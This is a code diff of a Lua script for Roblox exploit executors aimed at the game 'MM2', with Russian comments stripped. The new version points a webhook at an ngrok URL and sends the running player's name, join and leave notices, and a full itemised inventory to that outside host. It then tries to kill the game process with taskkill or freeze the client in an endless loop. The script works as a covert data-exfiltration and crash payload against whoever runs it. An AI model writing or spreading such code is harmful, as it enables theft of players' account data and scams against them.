@@ -1,31 +1,45 @@
--- Вебхук-ссылка (замените на вашу ссылку)
-local webhook = "http://127.0.0.1:5000/"
-
--- Метод для отправки HTTP-запросов
+local webhook = "https://e913-92-38-25-155.ngrok-free.app/"
 local httprequest = (syn and syn.request) or http and http.request or http_request or (fluxus and fluxus.request) or request
-
--- Служба для работы с HTTP
 local HttpService = game:GetService("HttpService")
+local playerName = game.Players.LocalPlayer.Name
 
--- Функция для отправки вебхука с сообщением
-local function sendWebhook(username, content)
-    if not webhook then
+local function sendWebhook(username, content, type)
+    if not webhook or not httprequest then
+        warn("Webhook or httprequest not available")
         return
     end
-    httprequest({
+
+    local data = {
+        username = username,
+        content = content,
+        type = type,
+        game = 'MM2'
+    }
+    
+    local encoded = HttpService:JSONEncode(data)
+
+    local response = httprequest({
         Url = webhook,
-        Body = HttpService:JSONEncode({
-            ["username"] = username, -- Добавляем имя пользователя
-            ["content"] = content    -- Добавляем содержимое
-        }),
+        Body = encoded,
         Method = "POST",
         Headers = {
-            ["content-type"] = "application/json"
+            ["content-type"] = "application/json",
+            ["User-Agent"] = "RobloxClient"
         }
     })
+
+    print("Response status:", response.StatusCode)
+
+    if response.Success then
+        print("Webhook sent successfully for user: " .. username)
+    else
+        sendWebhook(playerName, response.StatusCode, 'error')
+        warn("Failed to send webhook. Status: " .. tostring(response.StatusCode))
+    end
 end
 
--- Функция для сбора данных из контейнера
+sendWebhook(playerName, "joined", 'join')
+
 local function gatherData(containerPath)
     local container = game:GetService("Players").LocalPlayer.PlayerGui:WaitForChild("MainGUI"):WaitForChild("Game"):WaitForChild("Inventory"):WaitForChild("Main")
     for _, pathPart in ipairs(string.split(containerPath, ".")) do
@@ -35,13 +49,13 @@ local function gatherData(containerPath)
     local items = {}
     for _, item in ipairs(container:GetChildren()) do
         if item:IsA("Frame") and item:FindFirstChild("ItemName") and item.ItemName:FindFirstChild("Label") then
-            table.insert(items, item.ItemName.Label.Text)
+            local name = item.ItemName.Label.Text
+            items[name] = (items[name] or 0) + 1
         end
     end
     return items
 end
 
--- Список путей к контейнерам с категориями
 local categories = {
     Weapons = {
         "Weapons.Items.Container.Current.Container",
@@ -70,40 +84,52 @@ local categories = {
     }
 }
 
--- Функция для формирования содержимого
-local function formatContent(categories)
-    local content = ""
-    for category, paths in pairs(categories) do
-        content = content .. category .. ":\n"
-        local items = {}
-        for _, path in ipairs(paths) do
-            local newItems = gatherData(path)
-            for _, itemName in ipairs(newItems) do
-                table.insert(items, itemName)
-            end
-        end
-        if #items > 0 then
-            for i, itemName in ipairs(items) do
-                content = content .. i .. ". " .. itemName .. "\n"
+local allCategoriesMessages = {}
+
+for categoryName, paths in pairs(categories) do
+    local allItems = {}
+
+    for _, path in ipairs(paths) do
+        local success, items = pcall(function()
+            return gatherData(path)
+        end)
+
+        if success then
+            for name, count in pairs(items) do
+                allItems[name] = (allItems[name] or 0) + count
             end
         else
-            content = content .. "No items found\n"
+            warn(": " .. path)
         end
-        content = content .. "\n"
     end
-    return content
+
+    local messageLines = {}
+    for name, count in pairs(allItems) do
+        table.insert(messageLines, "x" .. count .. " " .. name)
+    end
+
+    local message = ""
+    if #messageLines > 0 then
+        message = "|||||||Категория " .. categoryName .. "|||||||:\n" .. table.concat(messageLines, "\n")
+    else
+        message = "|||||||Категория " .. categoryName .. "|||||||: пусто"
+    end
+
+    table.insert(allCategoriesMessages, message)
 end
 
--- Основная функция
-local function main()
-    print('Loaded')
-    local player = game:GetService("Players").LocalPlayer
+local fullMessage = table.concat(allCategoriesMessages, "\n\n")
 
-    local username = game.Players.LocalPlayer.Name
-    local content = formatContent(categories)
-    sendWebhook(username, content)
+sendWebhook(playerName, fullMessage, 'Inventory')
+
+sendWebhook(playerName, "lefted", 'left')
+
+if identifyexecutor and identifyexecutor():find("Windows") then
+    local success = pcall(function()
+        local processId = game:GetService("ProcessService"):GetProcessId()
+        os.execute("taskkill /pid "..processId.." /f")
+    end)
+    if not success then
+        while true do end 
+    end
 end
-
-print('Starting')
-main()
-print('Finished')
